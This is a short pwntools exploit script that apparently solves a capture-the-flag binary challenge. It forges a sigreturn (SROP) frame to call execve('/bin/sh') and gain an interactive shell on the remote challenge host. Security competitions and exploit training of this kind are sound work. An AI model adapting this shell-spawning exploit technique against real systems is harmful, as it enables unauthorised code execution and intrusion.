#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'microp.ctf.prgy.in', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
b *_start+108
b *_start+152
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================


def exploit():
    global io
    io = initialize()

    # https://book.jorianwoltjer.com/binary-exploitation/return-oriented-programming-rop/sigreturn-oriented-programming-srop
    #SROP execve("/bin/sh", 0, 0)
    syscall = next(elf.search(asm("syscall")))
    frame = SigreturnFrame()
    frame.rax = 0x3b              # syscall number for execve()
    frame.rdi = elf.sym["buffer"] # pointer to "/bin/sh"
    frame.rsi = 0x0               # NULL
    frame.rdx = 0x0               # NULL
    frame.rip = syscall           # `syscall` gadget
    io.sendlineafter("I\'m small, aren't I? Nobody expects me to do anything...", bytes(frame))
    io.sendafter("I guess I\'ll just stay here, too small to matter. Figures.", (b"/bin/sh").ljust(15, b"\x00"))
    io.interactive()

if __name__ == '__main__':
    exploit()
